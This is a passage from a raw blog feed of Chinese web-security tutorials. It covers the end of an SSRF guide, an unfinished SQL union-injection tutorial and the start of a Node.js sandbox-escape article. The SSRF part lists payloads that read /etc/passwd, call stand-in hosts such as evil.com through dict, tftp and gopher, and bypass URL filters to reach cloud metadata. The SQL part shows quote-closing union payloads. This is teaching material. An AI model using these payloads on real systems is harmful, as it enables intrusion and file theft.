class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><font color="red">注意事项</font></p><blockquote><ol><li>一般情况下PHP不会开启fopen的gopher wrapper</li><li>file_get_contents的gopher协议不能URL编码</li><li>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</li><li>curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</li><li>curl_exec() 默认不跟踪跳转，</li><li>file_get_contents() file_get_contents支持php:&#x2F;&#x2F;input协议</li></ol></blockquote><h2 id="ssrf中的伪协议"><a href="#ssrf中的伪协议" class="headerlink" title="ssrf中的伪协议"></a>ssrf中的伪协议</h2><p>当我们发现SSRF漏洞后，先试试伪协议</p><blockquote></blockquote><pre><code>file:/// 从文件系统中获取文件内容，如，file:///etc/passwddict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：sftp:// SSH文件传输协议或安全文件传输协议ldap:// 轻量级目录访问协议tftp:// 简单文件传输协议gopher:// 分布式文档传递服务，可使用gopherus生成payload</code></pre><p>例子：</p><ol><li><p>file：<br><a href="http://example.com/ssrf.php?url=file:///etc/passwd">http://example.com/ssrf.php?url=file:///etc/passwd</a><br><a href="http://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p></li><li><p>dict：能够引用允许通过DICT协议使用的定义或单词列表<br><a href="http://example.com/ssrf.php?dict://evil.com:1337/">http://example.com/ssrf.php?dict://evil.com:1337/</a> </p><blockquote><p>$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp&#x2F;*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0  </p></blockquote></li><li><p>sftp:<br>Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。<br><a href="http://example.com/ssrf.php?url=sftp://evil.com:1337/">http://example.com/ssrf.php?url=sftp://evil.com:1337/</a>  </p><blockquote><p>$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp&#x2F;*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2  </p></blockquote></li><li><p>dap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;:<br>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议<br><a href="http://example.com/ssrf.php?url=ldap://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</a>  </p><p> <a href="http://example.com/ssrf.php?url=ldaps://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</a>  </p><p> <a href="http://example.com/ssrf.php?url=ldapi://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</a>  </p></li><li><p>tftp:&#x2F;&#x2F;:<br>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p></li></ol><p><a href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a>  </p><blockquote><p>&#x2F;# nc -lvup 1337<br>   Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p></blockquote><ol start="6"><li>gopher:&#x2F;&#x2F;:<br>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息</li></ol><p><a href="http://example.com/ssrf.php?url=http://attacker.com/gopher.php">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</a> gopher.php (host it on acttacker.com):加上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>&#x2F;# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp&#x2F;*] accepted (family 2, sport 49398)Hissrftest</p></blockquote><h2 id="ssrf绕过方式"><a href="#ssrf绕过方式" class="headerlink" title="ssrf绕过方式"></a>ssrf绕过方式</h2><p>1、限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</p><blockquote><p>可以尝试采用http基本身份认证的方式绕过<br>如：<a href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异/">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</a><br>在PHP的parse_url中会识别<a href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p></blockquote><p>2.采用短网址绕过</p><blockquote><p>比如百度短地址<a href="https://dwz.cn/">https://dwz.cn/</a></p></blockquote><p>3.采用进制转换</p><blockquote><p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p></blockquote><p>4.利用特殊域名</p><blockquote><p>原理是DNS解析。xip.io可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p></blockquote><p>5.利用[::]</p><blockquote><p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254>>http://[::169.254.169.254]">http://169.254.169.254&gt;&gt;http://[::169.254.169.254]</a></p></blockquote><p>6.利用句号</p><blockquote><p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p></blockquote><p>7.CRLF 编码绕过</p><blockquote><p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p></blockquote><p>example.com&#x2F;?url&#x3D;<a href="http://eval.com%0d%0aHOST:fuzz.com%0d%0a">http://eval.com%0d%0aHOST:fuzz.com%0d%0a</a> </p><p>8.利用封闭的字母数字</p><blockquote><p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br><a href="http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</a><br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p></blockquote><h3 id="限制应对"><a href="#限制应对" class="headerlink" title="限制应对"></a>限制应对</h3><p>1.限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p><blockquote><p>采用http基本身份认证的方式绕过，即@<br><a href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p></blockquote><p>2.限制请求IP不为内网地址</p><blockquote><p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p></blockquote><p>3.限制请求只为http协议</p><blockquote><p>（1）采取302跳转<br>（2）采取短地址</p></blockquote><hr><p>参考文献：<a href="https://blog.csdn.net/qq_43378996/article/details/124050308?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170908672116800227424996%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170908672116800227424996&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_click~default-2-124050308-null-null.nonecase&utm_term=ssrf&spm=1018.2226.3001.4450">https://blog.csdn.net/qq_43378996/article/details/124050308?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170908672116800227424996%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170908672116800227424996&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_click~default-2-124050308-null-null.nonecase&amp;utm_term=ssrf&amp;spm=1018.2226.3001.4450</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> ssrf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入：从入门到入土</title>
      <link href="/2024/11/14/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/"/>
      <url>/2024/11/14/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
      
        <content type="html"><![CDATA[<p>（全文以MySQL为例）</p><h1 id="一-联合注入"><a href="#一-联合注入" class="headerlink" title="一.联合注入"></a>一.联合注入</h1><h2 id="1-简单原理"><a href="#1-简单原理" class="headerlink" title="1. 简单原理"></a>1. 简单原理</h2><p>在sql的查询语句中，union，是一个极度危险的函数。<br>其会将后面的语句作为sql命令执行，拼接到前面正常的结果集后。<br>例子：  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> usr <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> name  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> text1 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> lisi  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> gest  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------+</span></span><br></pre></td></tr></table></figure><p>1,2表头被拼接起来（这里的1，2实际上不存在）<br>那么加上恶意的查询  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> usr <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> home;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> name                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> text1               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> lisi                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> gest                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> flag&#123;ye <span class="keyword">is</span> watch u&#125; <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+---------------------+</span></span><br></pre></td></tr></table></figure><p>很明显，命令被执行了。<br>当然这只是理想情况，在实际的开发环境中我们几乎不可能知道这个<font color="yellow">表有几行几列，这个表叫什么，查询语句的格式等等……</font>  </p><blockquote><p>而正因为如此，其为我们进行漏洞注入提供了思路。</p></blockquote><h2 id="2-联合注入的步骤"><a href="#2-联合注入的步骤" class="headerlink" title="2. 联合注入的步骤"></a>2. 联合注入的步骤</h2><blockquote><ol><li>判断数据类型</li><li>查列数</li><li>却定字段的位置</li><li>查表名</li><li>查列名</li><li>获取数据</li></ol></blockquote><p>先根据以下语句的变化进行一个简单的理解：  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line"><span class="comment">-- 一般情况下，查询语句的where条件里对于列或表的表述的参数都是变量，一般是接受用户的get或post请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 而对于该变量的格式又有多种：</span></span><br><span class="line"> id<span class="operator">=</span>&quot;$id&quot;</span><br><span class="line"> id<span class="operator">=</span>(&quot;$id&quot;)</span><br><span class="line"> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>我们拿id&#x3D;’1’来举例子</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="comment">-- 1是客户端post传值给ssqqll的值</span></span><br><span class="line"><span class="comment">-- 如果： ssqqll = 1 union select 1,2 from home;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1 union select 1,2 from home;&#x27;</span>;</span><br><span class="line"><span class="comment">-- 由于php弱比较，会先将不同类型的给是转化成相同，像此处，php会将字符串逐一遍历来得到数字，得到1，所以注入失效了。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 但是要是我传参  ssqqll = 1&#x27; union select 1,2 from home;#（这里的#要url编码为%23，否则则会表示特殊锚点）</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> home;#<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+------+---------------------+</span></span><br><span class="line"><span class="string">| id   | name                |</span></span><br><span class="line"><span class="string">+------+---------------------+</span></span><br><span class="line"><span class="string">|    1 | admin               |</span></span><br><span class="line"><span class="string">|    2 | text1               |</span></span><br><span class="line"><span class="string">|    3 | lisi                |</span></span><br><span class="line"><span class="string">|    4 | gest                |</span></span><br><span class="line"><span class="string">|    1 | flag&#123;ye is watch u&#125; |</span></span><br><span class="line"><span class="string">+------+---------------------+</span></span><br></pre></td></tr></table></figure><p>最后，前方的‘1’闭合完成语句，后方把不符合语法的多余部分注释掉，完成联合注入  </p><p>ok，我们回到正题，首先第一步：</p><blockquote><p>判断数据类型，其实就是通过测试包错来试出他的包裹结构</p></blockquote><p>还记得上面的例子吗，包裹一共最基本也就4种形态<br>不外乎(1), ‘1’ ,”1” ,1  。</p><blockquote><p>当然这些都是可以<font color="red">相互嵌套的，能整出很多花样</font></p></blockquote><p>一个例子，抑或是一个思路</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 当我们传参？id=1时，有</span></span><br><span class="line">MYSql Test</span><br><span class="line">IDUsername</span><br><span class="line"><span class="number">1</span>admin</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ?id=1&#x27;</span></span><br><span class="line">无法取得数据: You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;&#x27; at line 1  </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>好，重点来了，根据报错信息，是出现了’1’’,所以断定为’1’包裹。  </p><blockquote><p>当然，有的情况是报错不会给出这么详细或是干脆没有报错。并不碍事，照着刚才的思路，先根据四种基本包裹一步一步慢慢排除</p></blockquote><p>这里给一个模板，以后做手注盘判断时可以直接拿来用  </p><blockquote><ol><li>select * from users where id&#x3D; 1 </li><li>select * from users where id&#x3D;’1’ </li><li>select * from users where id&#x3D;(‘1’)</li><li>select * from users where id&#x3D;”‘1’”</li><li>select * from users where id&#x3D;(1)</li><li>select * from users where id&#x3D;((‘1’))</li><li>select * from users where id&#x3D;(“‘1’”) </li><li>select * from users where id&#x3D;”1”</li></ol></blockquote><p>慢慢试，排除哪个就注释哪个（后面我们学到sqlmap时就不用这么麻烦了，这么做更多的是锻炼思维）</p><h1 id="二"><a href="#二" class="headerlink" title="二."></a>二.</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><h1 id="三"><a href="#三" class="headerlink" title="三."></a>三.</h1><h2 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h2><h2 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h2><h2 id="3-1"><a href="#3-1" class="headerlink" title="3."></a>3.</h2><h1 id="四"><a href="#四" class="headerlink" title="四."></a>四.</h1><h2 id="1-2"><a href="#1-2" class="headerlink" title="1."></a>1.</h2><h2 id="2-2"><a href="#2-2" class="headerlink" title="2."></a>2.</h2><h2 id="3-2"><a href="#3-2" class="headerlink" title="3."></a>3.</h2><h1 id="五"><a href="#五" class="headerlink" title="五."></a>五.</h1><h2 id="1-3"><a href="#1-3" class="headerlink" title="1."></a>1.</h2><h2 id="2-3"><a href="#2-3" class="headerlink" title="2."></a>2.</h2><h2 id="3-3"><a href="#3-3" class="headerlink" title="3."></a>3.</h2>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs沙箱逃逸</title>
      <link href="/2024/11/14/nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/11/14/nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="关于沙箱与nodejs-vm-vm2"><a href="#关于沙箱与nodejs-vm-vm2" class="headerlink" title="关于沙箱与nodejs vm&#x2F;vm2"></a>关于沙箱与nodejs vm&#x2F;vm2</h1><h2 id="什么是沙箱"><a href="#什么是沙箱" class="headerlink" title="什么是沙箱"></a>什么是沙箱</h2><p>我的世界是一款现象级沙盒类游戏，玩家可以在自己的世界随意创造，用自己的想象力搭建一个<b>虚拟的</b>，完全<b>与外界隔离</b>的世界。  </p><p>显而易见，沙箱sandbox就是一种虚拟隔离的安全机制，其中的应用与代码能够和外界全局变量隔绝（理想情况）。  </p><p>常见的例子就是docker和虚拟机VM。  </p><p>沙箱用到了三种技术：虚拟化技术访问控制技术和躲避技术。<br>这里着重讲一下虚拟化技术。</p><blockquote><p>虚拟化技术（Virtualization）是一种资源管理技术。通过虚拟化，计算机的很多实体资源，包括CPU、内存、磁盘空间等，都会被抽象化后成为可供分割和重新组合的状态，让用户可以自己重新分配电脑硬件资源。如图所示，在沙箱中会使用虚拟化技术为不可信的资源构建封闭的运行环境，在保证不可信资源功能正常运行的同时提供安全防护。简而言之，即是沙箱中被隔离的可疑或待测程序会使用沙箱中的资源运行，以保证沙箱外资源的安全，不影响沙箱外其他程序的运行。  </p></blockquote><p><img src="/img/vm1.png" alt="虚拟化技术">  </p><p>关于沙箱的一些特点  </p><p>沙箱根据虚拟化层次的不同，分为系统级别和容器级别。前者有一整套虚拟的操作系统，是一个完整的计算机软件架构，而后者则是部署在应用周围的一个容器（container）。沙箱的重点在于安全测试，即其跟其他通常意义上的容器有所不同，侧重点在于不让沙箱内部影响沙箱外部。  </p><blockquote><p>沙箱在部署上还分为硬件沙箱和云沙箱</p></blockquote><h2 id="nodejs-vn-vm2"><a href="#nodejs-vn-vm2" class="headerlink" title="nodejs vn&#x2F;vm2"></a>nodejs vn&#x2F;vm2</h2><h3 id="关于nodejs的作用域和几个API"><a href="#关于nodejs的作用域和几个API" class="headerlink" title="关于nodejs的作用域和几个API"></a>关于nodejs的作用域和几个API</h3><p>作用域</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1.</span>js</span><br><span class="line"><span class="keyword">var</span> height1 = <span class="number">175</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">height</span> = height1</span><br><span class="line"></span><br><span class="line">#<span class="number">2.</span>js</span><br><span class="line"><span class="keyword">const</span> age = <span class="number">20</span></span><br><span class="line"><span class="keyword">const</span> user = <span class="built_in">require</span>(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">height</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//20</span></span><br><span class="line"><span class="comment">//175</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>height的作用域是1.js，age的作用域是2.js。但是exports是一个能将js文件中元素输出的接口，故在2.js中，常量user通过require方法得到1.js里的所有元素。  </p><p>（是不是很像python的库概念）  </p><p>同时，在这连个js文件之上还有一个global全局作用域，nodejs全部的包和属性都挂载在global这个对象下。跟py里import*一个道理，可以直接访问。  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1.</span>js</span><br><span class="line"><span class="keyword">var</span> height1 = <span class="number">175</span></span><br><span class="line"><span class="variable language_">global</span>.<span class="property">name</span> = <span class="string">&quot;ThnPkm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">height</span> = height1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>js</span><br><span class="line"><span class="keyword">const</span> age = <span class="number">20</span></span><br><span class="line"><span class="keyword">const</span> user = <span class="built_in">require</span>(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">height</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="关于vm-vm2沙箱"><a href="#关于vm-vm2沙箱" class="headerlink" title="关于vm&#x2F;vm2沙箱"></a>关于vm&#x2F;vm2沙箱</h3><p>即船舰一个新的作用域去执行我们想要测试的代码，在nodejs中，作用域又称为上下文</p><p>在介绍几个vm的api前，先科普一下api的概念<br><strong>API</strong>（即<strong>应用程序编程接口</strong>）是一组定义的规则，使不同的应用程序能够相互通信。它充当处理系统之间数据传输的中间层，使公司能够向外部第三方开发人员、业务合作伙伴和公司内部部门开放其应用程序数据和功能²³。</p><p>具体来说，API有以下几个关键点：</p><ol><li><strong>程序之间的接口</strong>：API允许不同的应用程序、服务或系统之间共享信息和功能，以约定好的接口实现互联互通。</li><li><strong>形式多样</strong>：API<font color="red">不仅仅是函数，还可以是类、HTTP网络请求等形式。</font></li><li><strong>网络请求为基础</strong>：现代互联网中，以网络请求为基础的API是最常见的形式。这些API允许不同公司之间通过网络进行数据交换，比如调用滴滴的打车服务、获取天气数据等。</li></ol><blockquote><p><a href="https://zhuanlan.zhihu.com/p/144399137">https://zhuanlan.zhihu.com/p/144399137</a>.<br><a href="https://www.zhihu.com/question/21430743">https://www.zhihu.com/question/21430743</a>.<br><a href="http://www.didi.com/taxi">http://www.didi.com/taxi</a>.  </p></blockquote><h4 id="vm-runinThisContext-code"><a href="#vm-runinThisContext-code" class="headerlink" title="vm.runinThisContext(code)"></a>vm.runinThisContext(code)</h4><p>在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 